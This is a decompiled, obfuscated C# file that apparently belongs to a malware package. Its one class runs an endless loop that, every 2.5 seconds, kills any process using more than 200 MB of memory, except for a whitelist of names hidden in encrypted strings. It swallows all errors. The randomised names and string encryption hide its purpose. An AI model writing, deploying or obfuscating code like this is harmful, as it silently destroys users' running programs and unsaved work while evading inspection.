using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

public static class tcjyBQXuckgIF
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void bsQafecVWFAIF()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107365502)) && !process.ProcessName.Contains(getString_0(107365525)) && !process.ProcessName.Contains(getString_0(107365516)) && !process.ProcessName.Contains(getString_0(107365475)) && !process.ProcessName.Contains(getString_0(107365494)) && !process.ProcessName.Contains(getString_0(107365449)) && !process.ProcessName.Contains(getString_0(107365436)) && !process.ProcessName.Contains(getString_0(107365455)) && !process.ProcessName.Contains(getString_0(107365410)) && !process.ProcessName.Contains(getString_0(107365429)) && !process.ProcessName.Contains(getString_0(107365376)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static tcjyBQXuckgIF()
	{
		Strings.CreateGetStringDelegate(typeof(tcjyBQXuckgIF));
	}
}
